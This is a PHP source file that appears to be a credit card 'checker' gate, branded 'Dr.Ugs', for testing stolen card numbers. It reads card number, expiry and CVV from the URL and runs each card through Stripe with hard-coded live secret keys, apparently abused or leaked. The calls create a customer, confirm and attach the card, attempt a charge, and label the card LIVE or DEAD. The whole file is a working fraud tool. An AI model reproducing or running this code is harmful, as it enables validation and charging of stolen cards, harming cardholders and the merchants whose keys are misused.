<?php
session_start();
error_reporting(0);
ini_set('display_errors', 0);
function GetStr($string, $start, $end){
    $str = explode($start, $string);
    $str = explode($end, $str[1]);
    return $str[0];
}
function RandomString($length = 23) {
    $characters = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
    $charactersLength = strlen($characters);
    $randomString = '';
    for ($i = 0; $i < $length; $i++) {
        $randomString .= $characters[rand(0, $charactersLength - 1)];
    }
    return $randomString;
}
function emailGenerate($length = 10) {
    $characters = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
    $charactersLength = strlen($characters);
    $randomString = '';
    for ($i = 0; $i < $length; $i++) {
        $randomString .= $characters[rand(0, $charactersLength - 1)];
    }
    return $randomString.'@olxbg.cf';
}
extract($_GET);
$lista = str_replace(" " , "", $lista);
$i = explode("|", $lista);
$cc = $i[0];
$mm = $i[1];
$yyyy = $i[2];
$yy = substr($yyyy, 2, 4);
$cvv = $i[3];
$bin = substr($cc, 0, 8);
$last4 = substr($cc, 12, 16);
$email = urlencode(emailGenerate());
$m = ltrim($mm, "0");
fwrite(fopen('cookie.txt', 'w'), "");
$name = RandomString();
$lastname = RandomString();

$skeys = array(
  1 => 'sk_live_U3W52KTXU51yZwEYUBJO65Qs00AUCpL1se', 
  2 => 'sk_live_AEMR4UFETLVjbAQxrXqzmXO800j3uuyz13',
  3 => 'sk_live_e9ufyjH5HW1zuDHA2OPMdw0c00fKWJImyv',
  4 => 'sk_live_1jFtuvGEjav5OFNQX0jWwvt200rLHmF8rP',
    ); 
    $skey = array_rand($skeys);
    $sk = $skeys[$skey];

$pub = 'pk_live_E0M8014cALnySBMlZSj44duj';
//sk_live_UXvapvaiJvRdeBk4fvzfcysN00eWv9PnEl
// sk_live_63uDin3uHq0j8QgOpAXJ69Ym00BEc7Mdo9
$charges = array("5$","7$","3$","2.7$","5.4$","3.3$","4$","2.1$","6$","7$","1.8$","2.7$","5.5$","6.3$","4.4$");
$charge = $charges[array_rand($charges)];
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://lookup.binlist.net/'.$cc.'');
curl_setopt($ch, CURLOPT_USERAGENT, $user_agent);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'Host: lookup.binlist.net',
'Cookie: _ga=GA1.2.549903363.1545240628; _gid=GA1.2.82939664.1545240628',
'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8'
));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, '');
$fim = curl_exec($ch);
$fim = json_decode($fim,true);
$bank = $fim['bank']['name'];
$country = $fim['country']['alpha2'];
$type = $fim['type'];

if(strpos($fim, '"type":"credit"') !== false) {
  $type = 'Credit';
} else {
  $type = 'Debit';
}
curl_close($ch);

$ch = curl_init();

curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/customers'); ////To generate customer id
curl_setopt($curl, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_USERPWD, $sk. ':' . '');
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'content-type: application/x-www-form-urlencoded',
));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_POSTFIELDS, 'name=Doc Production');
$f = curl_exec($ch);
$info = curl_getinfo($ch);
$time = $info['total_time'];
$httpCode = $info['http_code'];
 $time = substr($time, 0, 4);

$id = trim(strip_tags(getstr($f,'"id": "','"')));

$ch = curl_init();

curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/setup_intents'); ////To generate payment token [It wont charge]
curl_setopt($curl, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_USERPWD, $sk. ':' . '');
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'content-type: application/x-www-form-urlencoded',
));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_POSTFIELDS, 'payment_method_data[type]=card&customer='.$id.'&confirm=true&payment_method_data[card][number]='.$cc.'&payment_method_data[card][exp_month]='.$mm.'&payment_method_data[card][exp_year]='.$yyyy.'&payment_method_data[card][cvc]='.$cvv.'');
 $result = curl_exec($ch);

$info = curl_getinfo($ch);
$time = $info['total_time'];
$httpCode = $info['http_code'];
 $time = substr($time, 0, 4);
 $c = json_decode(curl_exec($ch), true);
curl_close($ch);

 $pam = trim(strip_tags(getstr($result,'"payment_method": "','"')));

  $cvv = trim(strip_tags(getstr($result,'"cvc_check": "','"')));

if ($c["status"] == "succeeded") {
    
    
    $ch = curl_init();
    
    curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/customers/'.$id.'');
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
    
    curl_setopt($ch, CURLOPT_USERPWD, $sk . ':' . '');
    
   $result = curl_exec($ch);
    curl_close($ch);
    
    // $pm = $c["payment_method"];

    $ch = curl_init();

curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_methods/'.$pam.'/attach'); 
curl_setopt($curl, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_USERPWD, $sk. ':' . '');
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'content-type: application/x-www-form-urlencoded',
));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_POSTFIELDS, 'customer='.$id.'');
$result = curl_exec($ch);
 $d = $result;
 $attachment_to_her = json_decode(curl_exec($ch), true);
    curl_close($ch);
   $attachment_to_her;

$ch = curl_init();

curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/charges'); 
curl_setopt($curl, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_USERPWD, $sk. ':' . '');
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'content-type: application/x-www-form-urlencoded',
));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_POSTFIELDS, 'amount=1000&currency=usd&customer='.$id.'');
echo $result = curl_exec($ch);

    if (!isset($attachment_to_her["error"]) && isset($attachment_to_her["id"]) && $attachment_to_her["card"]["checks"]["cvc_check"] == "pass") {
        echo '<tr><td><span class="badge badge-success">LIVE</span></td><td>'.$lista.'</td><td><span class="badge badge-success">Approved ☤ [CVV MATCHED] [Charged: '.$charge.']</span></td><td>BANK:' . $bank . ' TYPE:' . $type . ' COUNTRY:' . $country .'</td></tr>';
    } elseif (!isset($attachment_to_her["error"]) && isset($attachment_to_her["id"]) && $attachment_to_her["card"]["checks"]["cvc_check"] == "unchecked") {
     echo '<tr><td><span class="badge badge-danger">DEAD</span></td><td>'.$lista.'</td><td><span class="badge badge-warning">Dead ☠ Dr.Ugs Unavailable Card [You can recheck it later]</span></td><td>BANK:' . $bank . ' TYPE:' . $type . ' COUNTRY:' . $country .'</td></tr>';
     
    } else {
    
     echo '<tr><td><span class="badge badge-warning">LIVE</span></td><td>'.$lista.'</td><td><span class="badge badge-warning">Approved ☤ Dr.Ugs [CVV MISSMATCHED] [Charged: '.$charge.']</span></td><td>BANK:' . $bank . ' TYPE:' . $type . ' COUNTRY:' . $country .'</td></tr>';
    
    }
    
}
elseif(strpos($result, '"cvc_check": "pass"')){

     echo '<tr><td><span class="badge badge-success">LIVE</span></td><td>'.$lista.'</td><td><span class="badge badge-success">Approved ☤ Dr.Ugs [CVV Matched] </i></font> <font class="badge badge-danger"> Additional Response: [' . $c["error"]["decline_code"] . '] [Not Charged]</i></font></span></td><td>BANK:' . $bank . ' TYPE:' . $type . ' COUNTRY:' . $country .'</td></tr>';

} 
elseif(strpos($result, 'security code is incorrect')){
    echo '<tr><td><span class="badge badge-success">LIVE</span></td><td>'.$lista.'</td><td><span class="badge badge-warning">Approved ☤ Dr.Ugs [CCN LIVE] [Not Charged]</span></td><td>BANK:' . $bank . ' TYPE:' . $type . ' COUNTRY:' . $country .'</td></tr>';
 

} 
elseif (isset($c["error"])) {
    if ($c["error"]["decline_code"] == "Your card's security code is incorrect.") {
           echo '<tr><td><span class="badge badge-success">LIVE</span></td><td>'.$lista.'</td><td><span class="badge badge-warning">Approved ☤ Dr.Ugs Your cards security code is incorrect.[CCN LIVE] [Not Charged]</span></td><td>BANK:' . $bank . ' TYPE:' . $type . ' COUNTRY:' . $country .'</td></tr>';
    }
        else{
        echo '<tr><td><span class="badge badge-danger">DEAD</span></td><td>'.$lista.'</td><td><span class="badge badge-danger">Dead ☠ Dr.Ugs ' . $c["error"]["message"] . ' ' . $c["error"]["decline_code"] . ' [Not Charged]</span></td><td>BANK:' . $bank . ' TYPE:' . $type . ' COUNTRY:' . $country .'</td></tr>';
}
}
else {
  echo '<tr><td><span class="badge badge-danger">DEAD</span></td><td>'.$lista.'</td><td><span class="badge badge-danger">Dead Stripe Gate / Dead SK</span></td><td></td></tr>';
}


// if (strpos($result, '"cvc_check": "pass"')) {
//   echo '<tr><td><span class="badge badge-success">LIVE</span></td><td>'.$lista.'</td><td><span class="badge badge-success">Card Approved and cvc check passed </span></td><td>BANK:' . $bank . ' TYPE:' . $type . ' COUNTRY:' . $country .'</td></tr>';
// }elseif (strpos($result, "incorrect_cvc")) {
//   echo '<tr><td><span class="badge badge-success">LIVE</span></td><td>'.$lista.'</td><td><span class="badge badge-warning">Card Approved cvv check failed</span></td><td>BANK:' . $bank . ' TYPE:' . $type . ' COUNTRY:' . $country .'</td></tr>';
// }elseif (strpos($result,'Your card has insufficient funds.')) {
//   echo '<tr><td><span class="badge badge-success">LIVE</span></td><td>'.$lista.'</td><td><span class="badge badge-success">[Message] Your card has insufficient funds. </span></td><td>BANK:' . $bank . ' TYPE:' . $type . ' COUNTRY:' . $country .'</td></tr>';
// }elseif (strpos($result, '"cvc_check": "unavailable"')) {
//   echo '<tr><td><span class="badge badge-danger">DEAD</span></td><td>'.$lista.'</td><td><span class="badge badge-danger">[Message] Your card was declined. [D-Code] Authorize Declined</span></td><td>BANK:' . $bank . ' TYPE:' . $type . ' COUNTRY:' . $country .'</td></tr>';
// }else{
//   echo '<tr><td><span class="badge badge-danger">DEAD</span></td><td>'.$lista.'</td><td><span class="badge badge-danger">'.$err.'</span></td><td>BANK:' . $bank . ' TYPE:' . $type . ' COUNTRY:' . $country .'</td></tr>';
// }
// }else{
//   echo '<tr><td><span class="badge badge-danger">DEAD</span></td><td>'.$lista.'</td><td><span class="badge badge-danger">'.$err.' </span></td><td>BANK:' . $bank . ' TYPE:' . $type . ' COUNTRY:' . $country .'</td></tr>';

// }
$ch = curl_init();

curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/customers/'.$id.'');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'DELETE');

curl_setopt($ch, CURLOPT_USERPWD, $sk . ':' . '');
curl_exec($ch);
curl_close($ch);
?>